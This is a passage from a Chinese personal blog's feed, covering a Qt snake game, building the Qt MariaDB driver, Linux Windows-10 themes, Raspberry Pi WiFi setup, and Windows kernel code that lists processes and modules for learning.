class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//即 判断是否超过了边界</span></span><br><span class="line">    <span class="keyword">if</span>((snake[<span class="number">0</span>][<span class="number">0</span>]&lt;<span class="number">0</span>||snake[<span class="number">0</span>][<span class="number">1</span>]&lt;<span class="number">0</span>||snake[<span class="number">0</span>][<span class="number">0</span>]&gt;Columns<span class="number">-1</span>||snake[<span class="number">0</span>][<span class="number">1</span>]&gt;Rows<span class="number">-1</span>))&#123;</span><br><span class="line">       qDebug()&lt;&lt;<span class="string">"Game Over"</span>;</span><br><span class="line">       timer-&gt;<span class="built_in">stop</span>();</span><br><span class="line">       QMessageBox::information(<span class="keyword">this</span>,<span class="string">"game over"</span>,<span class="string">"hit the wall"</span>);</span><br><span class="line">       <span class="keyword">this</span>-&gt;<span class="built_in">close</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">///</span></span><br><span class="line"><span class="comment">/// \brief Dialog::checkEatSelf</span></span><br><span class="line"><span class="comment">/// 是否吃到自己</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Dialog::checkEatSelf</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//遍历每个蛇节点，判断蛇头 snake[0]  是否等于 某一个蛇身节点 snake[n]</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> n = <span class="number">1</span>; n &lt;= eatfoodCount; n++) &#123;</span><br><span class="line">            <span class="keyword">if</span>(snake[<span class="number">0</span>][<span class="number">0</span>]==snake[n][<span class="number">0</span>]&amp;&amp;snake[<span class="number">0</span>][<span class="number">1</span>]==snake[n][<span class="number">1</span>])&#123;</span><br><span class="line">                qDebug()&lt;&lt;<span class="string">"Game Over;;;"</span>;</span><br><span class="line">                timer-&gt;<span class="built_in">stop</span>();</span><br><span class="line">                QMessageBox::information(<span class="keyword">this</span>,<span class="string">"game over"</span>,<span class="string">"eat self"</span>);</span><br><span class="line">                <span class="keyword">this</span>-&gt;<span class="built_in">close</span>();</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>代码中的注释还算是比较详细的吧。。。不过关键还是自己亲手写出来！<br>现在，来看一下运行结果<br><img src="/uploads/images/snake/snake1.gif" alt="img"></p>
<p>那么，下次在介绍用链表实现贪吃蛇！</p>
]]></content>
      <categories>
        <category>Programming</category>
      </categories>
      <tags>
        <tag>C++</tag>
        <tag>Linux</tag>
        <tag>Qt</tag>
      </tags>
  </entry>
  <entry>
    <title>Qt5.10.0编译MYSQL(Mariadb)驱动</title>
    <url>/linux-qt-com-mysql/</url>
    <content><![CDATA[<p>最近安装了新版本的Qt,当连接MySQL数据库时,又出现那个似曾相识的错误 <strong>QSqlDatabase: QMYSQL driver not loaded</strong>.知道后就赶紧去编译源码.然而你以为真的就那么一帆风顺吗?</p>
<a id="more"></a>

<h3 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h3><p>测试环境:</p>
<ul>
<li>Linux</li>
<li>Qt 5.10.0</li>
<li>MariaDB 10.1.29</li>
</ul>
<p>出现问题:<br>我是新换成了MariaDB,比起之前传统MySQL,相应的文件路径也发生了变化.而其结果时导致后面一连串的问题.<br>现在网上大部分都是以前的MySQL驱动编译教程,关于MariaDB数据库(本质上也是MySQL)的资料很少,所以这里就总结一下期间遇到的问题……</p>
<p>终端下输入: <code>$ locate mysql.h</code><br>在我这里输出</p>
<blockquote>
<p><strong>/usr/include/mariadb/mysql.h</strong><br>/usr/include/qt4/Qt/qsql_mysql.h<br>/usr/include/qt4/QtSql/qsql_mysql.h</p>
</blockquote>
<p>注意了没,就这里注定编译MySQL驱动会失败!因为默认的搜索路径为 <strong>/usr/include/mysql.h</strong></p>
<p>接下来我们来看看 <strong>libqsqlmysql.so</strong> 这个库文件<br><code>$ ldd libqsqlmysql.so</code><br><img src="/uploads/images/linux/file_001_qt1.png" alt="img"></p>
<p>他说 libqsqlmysql.so.18 这个库文件没有找到,那么就只能重新编译了…</p>
<h3 id="尝试成功"><a href="#尝试成功" class="headerlink" title="尝试成功"></a>尝试成功</h3><p>但是这里我还是讲一下我第一次尝试的方法(就是把 <strong>mariadb</strong> 的库链接到 libqsqlmysql.so.18)</p>
<p><code>$ locate libmariadb|grep so</code> 查看 mariadb库文件的路径</p>
<blockquote>
<p>/usr/lib/x86_64-linux-gnu/libmariadb.so<br>/usr/lib/x86_64-linux-gnu/libmariadb.so.2<br>/usr/lib/x86_64-linux-gnu/libmariadbclient.so.18<br><strong>/usr/lib/x86_64-linux-gnu/libmariadbclient.so.18.0.0</strong></p>
</blockquote>
<p>接着我再找下是否还存在之前的 <strong>libmysqlclient.so</strong><br><code>$ locate libmysqlclient.so</code></p>
<blockquote>
<p>/usr/lib/libmysqlclient.so</p>
</blockquote>
<p><code>$ ls -l /usr/lib/libmysqlclient.so</code> 发现 libmysqlclient.so 是个软链接</p>
<blockquote>
<p>lrwxrwxrwx 1 root root 43 9月 17 08:01 /usr/lib/libmysqlclient.so -&gt; /usr/lib/x86_64-linux-gnu/libmysqlclient.so</p>
</blockquote>
<p>接着 <code>$ ls -l /usr/lib/x86_64-linux-gnu/libmysqlclient.so</code></p>
<blockquote>
<p>ls: 无法访问’/usr/lib/x86_64-linux-gnu/libmysqlclient.so’: 没有那个文件或目录</p>
</blockquote>
<p>what!居然不存在!?所以赶紧把那链接删了</p>
<p>那么接下来就是给 <strong>libmariadbclient.so</strong> 设个软链接</p>
<blockquote>
<p>ln -s /usr/lib/x86_64-linux-gnu/libmariadbclient.so.18 /usr/lib/libmysqlclient.so<br><strong>ln -s /usr/lib/x86_64-linux-gnu/libmariadbclient.so.18 /usr/lib/libmysqlclient.so.18</strong></p>
</blockquote>
<p>最后看看 <code>$ ldd libqsqlmysql.so</code></p>
<blockquote>
<p>libmysqlclient.so.18 =&gt; /usr/lib/libmysqlclient.so.18 (0x00007fdf1a1df000)</p>
</blockquote>
<p>……居然成功了!!那还用编译个毛啊??然而这不是本文重点蛤……</p>
<h3 id="重点-编译MySQL驱动"><a href="#重点-编译MySQL驱动" class="headerlink" title="重点(编译MySQL驱动)"></a>重点(编译MySQL驱动)</h3><p>这里所说的驱动其实也不过就是一个链接库罢了……</p>
<p>首先进入该源代码目录下 <code>$ cd ${QTDIR}/5.10.0/Src/qtbase/src/plugins/sqldrivers/mysql</code></p>
<p>一般正常来讲接下来就是 <code>qmake mysql.pro</code>,<code>make</code><br>不过这里会出现一个错误<br><img src="/uploads/images/linux/file_002_qt2.png" alt="img"></p>
<p>这就要修改 <strong>mysql.pro</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">TARGET = qsqlmysql</span><br><span class="line">HEADERS += $$PWD/qsql_mysql_p.h</span><br><span class="line">SOURCES += $$PWD/qsql_mysql.cpp $$PWD/main.cpp</span><br><span class="line">QMAKE_USE += mysql</span><br><span class="line">OTHER_FILES += mysql.json</span><br><span class="line">INCLUDEPATH += /usr/include/mariadb</span><br><span class="line">PLUGIN_CLASS_NAME = QMYSQLDriverPlugin</span><br><span class="line">include(../qsqldriverbase.pri)</span><br></pre></td></tr></table></figure>

<p>注意我添加了 <strong>INCLUDEPATH += /usr/include/mariadb</strong></p>
<p>接着 <code>qmake;make</code> 恭喜,特么的又出现了个错误.不急找找看那出了问题…</p>
<blockquote>
<p>/opt/Qt5.10.0/5.10.0/gcc_64/bin/qmake -o Makefile mysql.pro<br>rm -f libqsqlmysql.so<br>g++ -Wl,–no-undefined -Wl,-O1 -Wl,–enable-new-dtags -Wl,-z,origin -Wl,-rpath,$ORIGIN/../../lib -Wl,-rpath,$ORIGIN/../../lib -shared -o libqsqlmysql.so .obj/qsql_mysql.o .obj/main.o .obj/moc_qsql_mysql_p.o -L/opt/Qt5.10.0/5.10.0/gcc_64/lib -lQt5Sql -lQt5Core <strong>-lmariadbclient</strong> -lpthread -lz -lm -ldl<br><strong>/usr/bin/ld: 找不到 -lmariadbclient</strong><br>collect2: error: ld returned 1 exit status<br>Makefile:80: recipe for target ‘../plugins/sqldrivers/libqsqlmysql.so’ failed<br>make: *** [../plugins/sqldrivers/libqsqlmysql.so] Error 1</p>
</blockquote>
<p>其实问题很简单,就是一个链接名字.在链接库时,默认匹配的为 libxxx.so ; 而后面的数字,如: libxxx.so.<strong>1.1.1</strong> 表示库的版本.</p>
<p><code>$ locate libmariadbclient.so</code> 看到,少了一个 libmariadbclient.so</p>
<blockquote>
<p>/usr/lib/x86_64-linux-gnu/libmariadbclient.so.18<br>/usr/lib/x86_64-linux-gnu/libmariadbclient.so.18.0.0</p>
</blockquote>
<p>瞬间问题简单化了,so,直接添加一个软链接就行了</p>
<blockquote>
<p>ln -s /usr/lib/x86_64-linux-gnu/libmariadbclient.so.18.0.0 /usr/lib/x86_64-linux-gnu/<strong>libmariadbclient.so</strong></p>
</blockquote>
<p>再一次 <code>qmake;make</code>……</p>
<blockquote>
<p>rm -f libqsqlmysql.so<br>g++ -Wl,–no-undefined -Wl,-O1 -Wl,–enable-new-dtags -Wl,-z,origin -Wl,-rpath,$ORIGIN/../../lib -Wl,-rpath,$ORIGIN/../../lib -shared -o libqsqlmysql.so .obj/qsql_mysql.o .obj/main.o .obj/moc_qsql_mysql_p.o -L/opt/Qt5.10.0/5.10.0/gcc_64/lib -lQt5Sql -lQt5Core -lmariadbclient -lpthread -lz -lm -ldl<br>mv -f libqsqlmysql.so <strong>../plugins/sqldrivers/</strong></p>
</blockquote>
<p>成功编译!</p>
<p>现在 <code>$ ../plugins/sqldrivers</code><br><code>$ ldd libqsqlmysql.so</code></p>
<blockquote>
<p><strong>libmariadbclient.so.18</strong> =&gt; /usr/lib/x86_64-linux-gnu/libmariadbclient.so.18 (0x00007f1bf7414000)</p>
</blockquote>
<p>现在可以把这个文件复制到 /opt/Qt5.10.0/5.10.0/gcc_64/plugins/sqldrivers 目录下了</p>
<h3 id="结束语"><a href="#结束语" class="headerlink" title="结束语"></a>结束语</h3><p>基本上到此为止了吧…..顺带提下,用C写的程序链接MySQL数据库时,传统的做法就是</p>
<blockquote>
<p>gcc xxx.c -o xxx <strong>-lmysqlclient</strong></p>
</blockquote>
<p>换成MariaDB后就成了</p>
<blockquote>
<p>gcc xxx.c -o xxx <strong>-lmariadb</strong></p>
</blockquote>
<p>这一点要特别注意啊!</p>
<p>bye</p>
]]></content>
      <categories>
        <category>Programming</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>Qt</tag>
        <tag>MySQL</tag>
      </tags>
  </entry>
  <entry>
    <title>Windows10 GTK Theme</title>
    <url>/windows10-gtk-theme/</url>
    <content><![CDATA[<p>最近偶然看到一篇文章,讲的是讲Linux主题配置成Windows10,咋一看,挺好奇的,所以才出了本文</p>
<p><img src="/uploads/images/windows/w10-3.png" alt="img"></p>
<a id="more"></a>

<h3 id="获取Windows10-GTK-Theme"><a href="#获取Windows10-GTK-Theme" class="headerlink" title="获取Windows10 GTK Theme"></a>获取Windows10 GTK Theme</h3><h4 id="Windows-10-Light"><a href="#Windows-10-Light" class="headerlink" title="Windows 10 Light"></a>Windows 10 Light</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/B00merang-Project/Windows-10.git</span><br><span class="line">sudo mv Windows-10 /usr/share/themes/</span><br></pre></td></tr></table></figure>

<h4 id="Windows-10-Dark"><a href="#Windows-10-Dark" class="headerlink" title="Windows 10 Dark"></a>Windows 10 Dark</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/B00merang-Project/Windows-10-Dark.git</span><br><span class="line">sudo mv Windows-10-Dark /usr/share/themes</span><br></pre></td></tr></table></figure>

<h4 id="Windows-10-Universal"><a href="#Windows-10-Universal" class="headerlink" title="Windows 10 Universal"></a>Windows 10 Universal</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/B00merang-Project/Windows-10-Metro.git</span><br><span class="line">sudo mv Windows-10-Metro /usr/share/themes/</span><br></pre></td></tr></table></figure>

<h3 id="设置图标-Icons"><a href="#设置图标-Icons" class="headerlink" title="设置图标(Icons)"></a>设置图标(Icons)</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wget https://github.com/Elbullazul/Windows-10/releases/download/v0.9.6/Windows.10.Icons.v0.4.1.zip</span><br><span class="line">unzip Windows.10.Icons.v0.4.1.zip</span><br><span class="line">mv &apos;Windows 10 Icons&apos; /usr/share/icons</span><br></pre></td></tr></table></figure>

<h3 id="设置墙纸-Wallpaper"><a href="#设置墙纸-Wallpaper" class="headerlink" title="设置墙纸(Wallpaper)"></a>设置墙纸(Wallpaper)</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd /usr/share/themes/Windows-10</span><br><span class="line">ls</span><br><span class="line">cp wallpaper.jpg ~/Pictures</span><br></pre></td></tr></table></figure>

<p>之后就可以通过 <strong>gnome-tweak-tool</strong> 设置主题了…</p>
<p>另外可参考<br><a href="https://www.addictivetips.com/ubuntu-linux-tips/make-linux-look-like-windows-10/" target="_blank" rel="noopener">How To Make Linux Look Like <strong>Windows 10</strong></a><br><a href="https://www.addictivetips.com/ubuntu-linux-tips/make-linux-look-like-windows-vista/" target="_blank" rel="noopener">How To Make Linux Look Like <strong>Windows Vista</strong></a><br><a href="https://www.addictivetips.com/ubuntu-linux-tips/make-your-linux-desktop-look-like-windows-xp/" target="_blank" rel="noopener">How To Make Linux Look Like <strong>Windows XP</strong></a><br><a href="https://www.addictivetips.com/ubuntu-linux-tips/make-linux-look-like-macos/" target="_blank" rel="noopener">How To Make Linux Look Like <strong>macOS</strong></a><br><a href="https://www.addictivetips.com/ubuntu-linux-tips/make-linux-look-like-chrome-os/" target="_blank" rel="noopener">How To Make Linux Look Like <strong>Chrome OS</strong></a></p>
<p>bye~~</p>
]]></content>
      <categories>
        <category>Others</category>
      </categories>
      <tags>
        <tag>Windows</tag>
      </tags>
  </entry>
  <entry>
    <title>电脑无线连接到树莓派(RaspPi)</title>
    <url>/connect-reappi/</url>
    <content><![CDATA[<p>当得到一块树莓派时，已经刷入raspbian系统，除了用网线连接树莓派和电脑外，还可以通过无线WiFi连接到树莓派</p>
<a id="more"></a>

<h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h3><p>正常来讲，我得用另一个根网线把电脑和树莓派连在一起。在主机上连接无线WiFi，再 <strong>fping -asqg 192.168.1.0/24</strong> 或 <strong>nmap</strong> 找到局域网下树莓派的IP地址。而现在，我不要让主机连接WiFi(这样网络速度快很多)，即在树莓派启动时自动连接到WiFi热点。</p>
<p>因此，可以把已经刷好的SD卡里面的有关网络的系统配置文件 <strong>/etc/network/interfaces</strong> 进行修改。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">auto lo</span><br><span class="line">iface lo inet loopback</span><br><span class="line">auto eth0</span><br><span class="line">iface eth0 inet static</span><br><span class="line">address 192.168.1.105</span><br><span class="line">netmask 255.255.255.0</span><br><span class="line">gateway 192.168.1.1</span><br><span class="line">#auto wlan0</span><br><span class="line">allow-hotplug wlan0</span><br><span class="line">iface wlan0 inet static </span><br><span class="line">address 192.168.1.110</span><br><span class="line">netmask 255.255.255.0</span><br><span class="line">gateway 192.168.1.1</span><br><span class="line">wpa-ssid WiFi名称</span><br><span class="line">wpa-psk WiFi密码</span><br></pre></td></tr></table></figure>

<p>这里我将wlan0接口设置成静态地址，这样的话以后就可以很方便通过ssh连接到树莓派了。</p>
<p>现在再把SD卡插入树莓派，启动，稍等片刻 <strong>fping -asqg 192.168.1.0/24</strong> 扫描局域网主机后，就可以看到设置的静态IP地址192.168.1.11</p>
<p>或者指定一个 <strong>wpa_supplicant.conf</strong></p>
<p>/etc/network/interfaces</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#auto wlan0</span><br><span class="line">allow-hotplug wlan0</span><br><span class="line">iface wlan0 inet manual</span><br><span class="line">wpa-roam /etc/wpa_supplicant/wpa_supplicant.conf</span><br><span class="line">iface default inet dhcp</span><br></pre></td></tr></table></figure>

<p>/etc/wpa_supplicant/wpa_supplicant.conf</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ctrl_interface=DIR=/var/run/wpa_supplicant GROUP=netdev</span><br><span class="line">update_config=1</span><br><span class="line">network=&#123;</span><br><span class="line">	ssid=&quot;wifi名称&quot;</span><br><span class="line">	psk=&quot;wifi密码&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>最后通过 <code>ssh pi@192.168.1.110</code> 即可连接到树莓派</p>
<p>bye~</p>
]]></content>
      <categories>
        <category>RaspberryPi</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>树莓派</tag>
      </tags>
  </entry>
  <entry>
    <title>利用winpcap获取网络数据传输</title>
    <url>/windows-kernel/</url>
    <content><![CDATA[<blockquote>
<p>说明：在我没转到linux之前，我粗略的学过windows内核编程，以下是在学习过程中编录的内容，以供参考</p>
</blockquote>
<p>工具：WDK 7+VS2015 测试平台：虚拟机 WINDOWS XP</p>
<a id="more"></a>



<ul>
<li><p>包含的头文件</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;ntifs.h&gt;#include &lt;ntstrsafe.h&gt;</span></span></span><br></pre></td></tr></table></figure>
</li>
<li><p>声明的API函数</p>
</li>
</ul>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">NTKERNELAPI HANDLE <span class="title">PsGetProcessInheritedFromUniqueProcessId</span><span class="params">(IN PEPROCESS <span class="built_in">Process</span>)</span></span>;</span><br><span class="line"><span class="function">NTKERNELAPI  PPEB_EX  <span class="title">PsGetProcessPeb</span><span class="params">(PEPROCESS <span class="built_in">Process</span>)</span></span>;</span><br><span class="line"><span class="function">NTKERNELAPI NTSTATUS <span class="title">PsLookupProcessByProcessId</span><span class="params">(HANDLE Id, PEPROCESS *<span class="built_in">Process</span>)</span></span>;</span><br><span class="line"><span class="function">NTKERNELAPI NTSTATUS <span class="title">PsLookupThreadByThreadId</span><span class="params">(HANDLE Id, PETHREAD *Thread)</span></span>;</span><br><span class="line"><span class="function">NTKERNELAPI PEPROCESS <span class="title">IoThreadToProcess</span><span class="params">(PETHREAD Thread)</span></span>;</span><br><span class="line"><span class="comment">//NTKERNELAPI VOID NTAPI KeAttachProcess(PEPROCESS Process);</span></span><br><span class="line"><span class="comment">//NTKERNELAPI VOID NTAPI KeDetachProcess();</span></span><br><span class="line"><span class="comment">//NTKERNELAPI VOID NTAPI KeStackAttachProcess(PEPROCESS Process, PKAPC_STATE ApcState);</span></span><br><span class="line"><span class="comment">//NTKERNELAPI VOID NTAPI KeUnstackDetachProcess(PKAPC_STATE ApcState);</span></span><br></pre></td></tr></table></figure>

<ul>
<li>因为要通过 <code>PEPROCESS</code> 来获取进程和模块，所以还要用到几个结构体，在<strong>WinDbg</strong> 可看到。<br>这里新建一个头文件，包含了PEB等信息</li>
</ul>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"peb.h"</span></span></span><br><span class="line">如下：</span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> once</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;ntifs.h&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">PEB_LDR_DATA_EX</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">ULONG Length; <span class="comment">// +0x00  </span></span><br><span class="line">BOOLEAN Initialized; <span class="comment">// +0x04  </span></span><br><span class="line">PVOID SsHandle; <span class="comment">// +0x08  </span></span><br><span class="line">LIST_ENTRY InLoadOrderModuleList; <span class="comment">// +0x0c </span></span><br><span class="line">LIST_ENTRY InMemoryOrderModuleList; <span class="comment">// +0x14</span></span><br><span class="line">LIST_ENTRY InInitializationOrderModuleList;<span class="comment">// +0x1c  </span></span><br><span class="line">&#125;PEB_LDR_DATA_EX, *PPEB_LDR_DATA_EX;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">LDR_DATA_TABLE_ENTRY_EX</span> &#123;</span></span><br><span class="line">LIST_ENTRY InLoadOrderLinks;</span><br><span class="line">LIST_ENTRY InMemoryOrderLinks;</span><br><span class="line">LIST_ENTRY InInitializationOrderLinks;</span><br><span class="line">PVOID DllBase;</span><br><span class="line">PVOID EntryPoint;</span><br><span class="line">ULONG SizeOfImage;</span><br><span class="line">UNICODE_STRING FullDllName;</span><br><span class="line">UNICODE_STRING BaseDllName;</span><br><span class="line">ULONG Flags;</span><br><span class="line">USHORT LoadCount;</span><br><span class="line">USHORT TlsIndex;</span><br><span class="line"><span class="keyword">union</span> &#123;</span><br><span class="line">LIST_ENTRY HashLinks;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">PVOID SectionPointer;</span><br><span class="line">ULONG CheckSum;</span><br><span class="line">&#125;;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">union</span> &#123;</span><br><span class="line">ULONG TimeDateStamp;</span><br><span class="line">PVOID LoadedImports;</span><br><span class="line">&#125;;</span><br><span class="line">PVOID EntryPointActivationContext;      </span><br><span class="line">PVOID PatchInformation;</span><br><span class="line">LIST_ENTRY ForwarderLinks;</span><br><span class="line">LIST_ENTRY ServiceTagLinks;</span><br><span class="line">LIST_ENTRY StaticLinks;</span><br><span class="line">PVOID ContextInformation;</span><br><span class="line">PVOID OriginalBase;</span><br><span class="line">LARGE_INTEGER LoadTime;</span><br><span class="line">&#125; LDR_DATA_TABLE_ENTRY_EX, *PLDR_DATA_TABLE_ENTRY_EX;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">CURDIR</span> &#123;</span></span><br><span class="line">UNICODE_STRING DosPath;</span><br><span class="line">PVOID Handle;</span><br><span class="line">&#125;CURDIR, *PCURDIR;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">RTL_DRIVE_LETTER_CURDIR</span> &#123;</span></span><br><span class="line">USHORT Flags;</span><br><span class="line">USHORT Length;</span><br><span class="line">ULONG TimeStamp;</span><br><span class="line">STRING DosPath;</span><br><span class="line">&#125;RTL_DRIVE_LETTER_CURDIR, *PRTL_DRIVE_LETTER_CURDIR;</span><br><span class="line"><span class="comment">//进程参数</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">RTL_USER_PROCESS_PARAMETERS</span>&#123;</span></span><br><span class="line">ULONG MaximumLength;</span><br><span class="line">ULONG Length;</span><br><span class="line">ULONG Flags;</span><br><span class="line">ULONG DebugFlags;</span><br><span class="line">PVOID ConsoleHandle;</span><br><span class="line">ULONG ConsoleFlags;</span><br><span class="line">PVOID StandardInput;</span><br><span class="line">PVOID StandardOutput;</span><br><span class="line">PVOID StandardError;</span><br><span class="line">CURDIR CurrentDirectory;</span><br><span class="line">UNICODE_STRING DllPath;</span><br><span class="line">UNICODE_STRING ImagePathName;</span><br><span class="line">UNICODE_STRING CommandLine;</span><br><span class="line">PVOID Environment;</span><br><span class="line">ULONG StartingX;</span><br><span class="line">ULONG StartingY;</span><br><span class="line">ULONG CountX;</span><br><span class="line">ULONG CountY;</span><br><span class="line">ULONG CountCharsX;</span><br><span class="line">ULONG CountCharsY;</span><br><span class="line">ULONG FillAttribute;</span><br><span class="line">ULONG WindowFlags;</span><br><span class="line">ULONG ShowWindowFlags;</span><br><span class="line">UNICODE_STRING WindowTitle;</span><br><span class="line">UNICODE_STRING DesktopInfo;</span><br><span class="line">UNICODE_STRING ShellInfo;</span><br><span class="line">UNICODE_STRING RuntimeData;</span><br><span class="line">RTL_DRIVE_LETTER_CURDIR CurrentDirectores[<span class="number">32</span>];</span><br><span class="line">&#125;RTL_USER_PROCESS_PARAMETERS,*PRTL_USER_PROCESS_PARAMETERS;</span><br><span class="line"><span class="comment">//进程环境块（因为Windows内核有一个机构PEB，为了不重定义，所以就另起一个名字）</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">PEB_EX</span> &#123;</span></span><br><span class="line">UCHAR InheritedAddressSpace;</span><br><span class="line">UCHAR ReadImageFileExecOptions;</span><br><span class="line">UCHAR BeingDebugged;</span><br><span class="line">UCHAR SpareBool;</span><br><span class="line">PVOID Mutant;</span><br><span class="line">PVOID ImageBaseAddress;</span><br><span class="line">PPEB_LDR_DATA_EX Ldr;</span><br><span class="line">PRTL_USER_PROCESS_PARAMETERS  ProcessParameters;</span><br><span class="line">UCHAR Reserved4[<span class="number">104</span>];</span><br><span class="line">PVOID Reserved5[<span class="number">52</span>];</span><br><span class="line">PVOID PostProcessInitRoutine;</span><br><span class="line">PVOID Reserved7;</span><br><span class="line">UCHAR Reserved6[<span class="number">128</span>];</span><br><span class="line">ULONG SessionId;</span><br><span class="line">&#125; PEB_EX, *PPEB_EX;</span><br></pre></td></tr></table></figure>

<ul>
<li>用于遍历进程函数</li>
</ul>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">EnumProcess</span><span class="params">(PEPROCESS eprocess)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	KAPC_STATE ks;</span><br><span class="line">	<span class="keyword">if</span> (!MmIsAddressValid(eprocess))</span><br><span class="line">	<span class="keyword">return</span>;</span><br><span class="line">	<span class="comment">//获取 PEB信息</span></span><br><span class="line">	PPEB_EX peb = PsGetProcessPeb(eprocess);</span><br><span class="line">	<span class="keyword">if</span> (!peb)</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	<span class="comment">//依附进程!!!!!!!!!!!!!!</span></span><br><span class="line">	KeStackAttachProcess(eprocess, &amp;ks);</span><br><span class="line">	__try</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (PsGetProcessId(eprocess)!=<span class="number">0</span>)</span><br><span class="line">		&#123;</span><br><span class="line">		<span class="comment">//获取 进程参数</span></span><br><span class="line">		PRTL_USER_PROCESS_PARAMETERS rtl_user_process_param = </span><br><span class="line">(PRTL_USER_PROCESS_PARAMETERS)peb-&gt;ProcessParameters;</span><br><span class="line">		DbgPrint(<span class="string">"CommandLine:%wZ\n"</span>, &amp;rtl_user_process_param-&gt;CommandLine);</span><br><span class="line">		DbgPrint(<span class="string">"ImagePath=%wZ\n"</span>, &amp;rtl_user_process_param-&gt;ImagePathName);</span><br><span class="line">		<span class="comment">//DbgPrint("Window Title=%wZ\n", &amp;rtl_user_process_param-&gt;WindowTitle);</span></span><br><span class="line">		DbgPrint(<span class="string">"——————————————————————————————"</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	__except (EXCEPTION_EXECUTE_HANDLER)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">//DbgPrint("Can not Process...");</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//取消依附进程</span></span><br><span class="line">	KeUnstackDetachProcess(&amp;ks);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>遍历模块，大体上和遍历进程一样，但也要注意区别</li>
</ul>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">EnumModules</span><span class="params">(PEPROCESS eprocess)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	KAPC_STATE ks;</span><br><span class="line">	<span class="keyword">if</span> (!MmIsAddressValid(eprocess))</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	<span class="comment">//获取 PEB信息</span></span><br><span class="line">	PPEB_EX peb = PsGetProcessPeb(eprocess);</span><br><span class="line">	<span class="keyword">if</span> (!peb)</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	<span class="comment">//依附进程!!!!!!!!!!!!!!</span></span><br><span class="line">	KeStackAttachProcess(eprocess, &amp;ks);</span><br><span class="line">	__try</span><br><span class="line">	&#123;</span><br><span class="line">		PPEB_LDR_DATA_EX peb_LDR_data = (PPEB_LDR_DATA_EX)peb-&gt;Ldr;</span><br><span class="line">		PLIST_ENTRY list_entry = &amp;peb_LDR_data-&gt;InLoadOrderModuleList;</span><br><span class="line">		<span class="comment">//先获取第一个</span></span><br><span class="line">		PLIST_ENTRY currentList = list_entry-&gt;Flink;</span><br><span class="line">		<span class="keyword">while</span> (currentList!=list_entry)</span><br><span class="line">		&#123;</span><br><span class="line">		PLDR_DATA_TABLE_ENTRY_EX ldr_data_table_entry =(PLDR_DATA_TABLE_ENTRY_EX)currentList;</span><br><span class="line">		DbgPrint(<span class="string">"Module Base=%p DllPath=%wZ\n"</span>,ldr_data_table_entry-&gt;DllBase, &amp;ldr_data_table_entry-&gt;FullDllName);</span><br><span class="line">		<span class="comment">//指向下一个</span></span><br><span class="line">		currentList = currentList-&gt;Flink;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	__except (EXCEPTION_EXECUTE_HANDLER)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment">//DbgPrint("Can not Modules...");</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//取消依附进程</span></span><br><span class="line">	KeUnstackDetachProcess(&amp;ks);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>这个函数把上面两个函数整合在一起了</li>
</ul>
